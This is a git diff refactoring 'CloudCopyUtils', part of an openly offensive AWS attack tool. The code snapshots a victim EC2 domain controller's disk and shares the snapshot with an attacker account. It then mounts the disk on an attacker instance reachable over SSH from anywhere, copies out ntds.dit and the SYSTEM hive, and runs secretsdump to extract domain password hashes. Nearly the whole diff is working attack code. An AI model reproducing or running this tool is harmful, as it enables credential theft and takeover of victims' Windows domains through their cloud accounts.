@@ -4,34 +4,33 @@ import boto3
 import paramiko
 from botocore.exceptions import ClientError
 
-
+'''
+Util methods for actually CloudCopying
+'''
 class CloudCopyUtils:
-    def __init__(self, loginContext, attackContext):
-        self.loginContext = loginContext
-        self.attackContext = attackContext
-        self.victimInstance = None
-        self.victimSnapshot = None
-        self.attackingInstance = None
-        self.securityGroup = None
-        self.botoClient = None
-        self.createEc2Resource()
-
-    def setLoginContext(self, loginContext):
-        self.loginContext = loginContext
+    def __init__(self, loginContext):
+        self.loginContext = loginContext  # contains context for the CloudCopy attack
+        self.victimInstance = None  # boto3.Instance object that is the victim instance we are CloudCopying
+        self.victimSnapshot = None  # boto3.Snapshot that is the snapshot made from victim instance
+        self.attackingInstance = None  # boto3.Instance object that is the attacking instance holding the snapshot
+        self.securityGroup = None  # boto3.SecurityGroup that is the security group for accessing the attacker instance
+        self.botoClient = None  # boto3 client for accessing AWS programmatically
+        self.createEc2Resource()  # initializes the client
 
     def setAttackContext(self, attackContext):
-        self.attackContext = attackContext
+        self.loginContext['mode'] = attackContext
 
+    # creates the boto3.Resource for accessing AWS
     def createEc2Resource(self):
         if self.loginContext['type'] == 'profile':
-            if self.attackContext == 'victim':
+            if self.loginContext['mode'] == 'victim':
                 self.botoClient = boto3.Session(profile_name=self.loginContext['options']['victimProfile'],
                                                 region_name=self.loginContext['options']['region']).resource('ec2')
             else:
                 self.botoClient = boto3.Session(profile_name=self.loginContext['options']['attackerProfile'],
                                                 region_name=self.loginContext['options']['region']).resource('ec2')
         else:
-            if self.attackContext == 'victim':
+            if self.loginContext['mode'] == 'victim':
                 self.botoClient = boto3.Session(
                     aws_access_key_id=self.loginContext['options']['victimAccessKey'],
                     aws_secret_access_key=self.loginContext['options']['victimSecretKey'],
@@ -42,6 +41,7 @@ class CloudCopyUtils:
                     aws_secret_access_key=self.loginContext['options']['attackerSecretKey'],
                 ).resource('ec2')
 
+    # lists available instances within the victim AWS account in the specified region
     def listInstances(self):
         instances = list(self.botoClient.instances.all())
         for index, instance in enumerate(instances):
@@ -50,6 +50,7 @@ class CloudCopyUtils:
 
         self.victimInstance = instances[int(input("which instance are we CloudCopying today?"))]
 
+    # creates a snapshot of a specified victim instance
     def createSnapshot(self):
         victimVolumeId = self.victimInstance.block_device_mappings[0]['Ebs']['VolumeId']
         try:
@@ -71,9 +72,10 @@ class CloudCopyUtils:
                 return False
         return True
 
-    def modifySnapshot(self, attackerAccountId):
+    # modifies the created snapshot to share it with the attacker owned account
+    def modifySnapshot(self):
         self.victimSnapshot.modify_attribute(Attribute='createVolumePermission', CreateVolumePermission={
-            'Add': [{'UserId': attackerAccountId}]
+            'Add': [{'UserId': self.loginContext['options']['youraccountid']}]
         })
         print("Snapshot should have been shared. Switching to attacker account.")
         self.setAttackContext('attacker')
@@ -81,7 +83,7 @@ class CloudCopyUtils:
         self.victimSnapshot = self.botoClient.Snapshot(self.victimSnapshot.snapshot_id)
         while True:
             try:
-                self.victimSnapshot.description  # just checking if this fails to determine if it is in attacker control or not
+                self.victimSnapshot.description  # just checking if this fails to determine if it's in attacker control
                 break
             except ClientError:
                 print("Snapshot hasn't arrived, waiting...")
@@ -89,6 +91,7 @@ class CloudCopyUtils:
 
         print("We have the snapshot in our control time to mount it to an instance!")
 
+    # creates a security group for the attacker controlled instance so that we can SSH to it. It's open to the world FYI
     def createSecurityGroup(self):
         security_groups = list(self.botoClient.security_groups.all())
         for security_group in security_groups:
@@ -106,9 +109,12 @@ class CloudCopyUtils:
         print("Finished creating security group for instance")
         self.securityGroup = security_group
 
-    def createInstance(self, instanceSshKey):
+    # creates a new attacker owned EC2 instance that uses the snapshot as an attached disk containing the DC hashes
+    def createInstance(self):
         if self.loginContext['options']['instance_id'] == '':
-            print("creating instance with key: " + instanceSshKey[instanceSshKey.rindex('/')+1:instanceSshKey.rindex('.')])
+            instanceSshKey = self.loginContext['options']['localkeypath']
+            print("creating instance with key: " +
+                  instanceSshKey[instanceSshKey.rindex('/')+1:instanceSshKey.rindex('.')])
             self.attackingInstance = self.botoClient.create_instances(
                 BlockDeviceMappings=[{
                     "DeviceName": '/dev/sdf',
@@ -139,7 +145,11 @@ class CloudCopyUtils:
             self.attackingInstance = self.botoClient.Instance(self.loginContext['options']['instance_id'])
             print("Using pre CloudCopied instance: " + self.loginContext['options']['instance_id'])
 
-    def grabDCHashFiles(self, instanceSshKey):
+    # SSH's into the instance mounts the DC snapshot copies the ntds.dit and SYSTEM file gives ownership to ec2-user
+    # SFTP's into the instance and downloads the ntds.dit and SYSTEM file locally
+    # runs impacket's secretsdump tool to recreate the hashes. Expects secretsdump to be on your path.
+    def grabDCHashFiles(self):
+        instanceSshKey = self.loginContext['options']['localkeypath']
         connection, sftp = self.connectToInstance(instanceSshKey)
         #   have to block on these calls to ensure they happen in order
         _, stdout, _ = connection.exec_command("sudo mkdir /windows")
@@ -167,7 +177,9 @@ class CloudCopyUtils:
         subprocess.run(
             ["secretsdump.py", "-system", "./SYSTEM", "-ntds", "./ntds.dit", "local", "-outputfile", "secrets"])
 
+    # helper to create the connection to the attacker instance
     def connectToInstance(self, instanceSshKey):
+        print(instanceSshKey)
         key = paramiko.RSAKey.from_private_key_file(instanceSshKey)
         connection = paramiko.SSHClient()
         connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
